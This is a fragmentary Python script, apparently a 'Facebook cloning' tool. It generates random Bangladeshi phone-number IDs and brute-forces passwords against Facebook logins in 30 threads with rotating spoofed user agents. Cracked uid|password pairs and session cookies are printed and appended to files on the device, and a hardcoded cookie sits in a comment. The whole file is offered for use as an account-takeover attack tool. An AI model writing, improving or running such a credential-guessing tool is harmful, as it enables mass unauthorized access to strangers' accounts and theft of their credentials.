...
import os
import os
os.system('espeak -a 200 " WELCOME NIB TOOLS"')
os.system("wellcome nib tools")
...
for ua in range(5000):
	...
	ugen.append(alhaj)
os.system("xdg-open https://www.facebook.com/mim.noyon2")
# LOGO
logo = ("""
\033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
...
$$/   $$/ $$$$$$/ $$$$$$$/  
                            ...
                            created by nib noyon                                                                                                                                                                                                                                                                                                                           
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝      \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m[ WORKING MOBILE DATA AND WIFI ALSO ]       \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38m [nib Noyon] \33[1;38m     \033[1;31m 
╠══[FACEBOOK                 • [Xsilent xb Noyon]  \033[1;97m  
╠══[GITHUB                   • \33[1;38m nib2 ]\33[1;34m   
╠══[TOOLS                    • [Free]             \33[1;32m  
...
def Main():
        ...
        print(logo)
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32mRANDOM BD")
        print(" \033[1;35m[\033[1;32m2\033[1;35m] \033[1;32mCONTACT ADMIN")
        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31mEXIT")
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Alhaj =input("\n \033[1;35m[💝❤️‍🔥\033[1;35m] \033[1;32mSELECTED YOUR OPTION : ")
        if Alhaj in ["1","01"]:
            sexy()
        if Alhaj in ["2","02"]:
        	os.system('xdg-open t.me/.me/+88017070645')
        if Alhaj in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        tl = str(len(user))
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print('\033[1;33m[💝❤️‍🔥\033[1;33m] \033[1;36mYOUR TOTAL IDS : \033[1;32m'+tl)
        print("\033[1;33m[💝❤️‍🔥\033[1;33m] \033[1;36mYOUR SIM CODE :\033[1;32m "+code)
        print('\033[1;33m[💝❤️‍🔥\033[1;33m]\033[1;35m PLEASE WAIT CLONING START')
        print('\033[1;33m[💝❤️‍🔥\033[1;33m] \033[1;34mUSE FLIGHT MODE ON/OF FOR SPEED UP')
        print('\033[1;33m[💝❤️‍🔥\033[1;33m] \033[1;35mSUPER FAST SPEED CLONING')
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [💝❤️‍🔥] OK NIB-OK.txt')
    print(' [💝❤️‍🔥] CP NIB-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[NIB-KING]\033[1;36m😍[%s/%s]💝❤️‍🔥\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    # 'cookie': 'datr=XWiNZpLHPBkh05vV-oE234oK; sb=XWiNZsP1Tre5sofTkeM2gipv; m_pixel_ratio=1.875; ps_n=1; ps_l=1; wd=384x730; fr=0n2WiFUl9kNItnQWp..BmjWhd..AAA.0.0.BmjXHp.AWXVwC3ugXA',
    'dpr': '1.875',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Google Chrome";v="124", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="124", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    ...
    # =[ UA = PRO ]= #
    'user-agent': 'Mozilla/5.0 (Linux; Android 14; 100015685-A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6289.216 Mobile Safari/537.36',
    'viewport-width': '980',}
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     The NIB𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     The NIB𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mNIB-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/NIBCP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
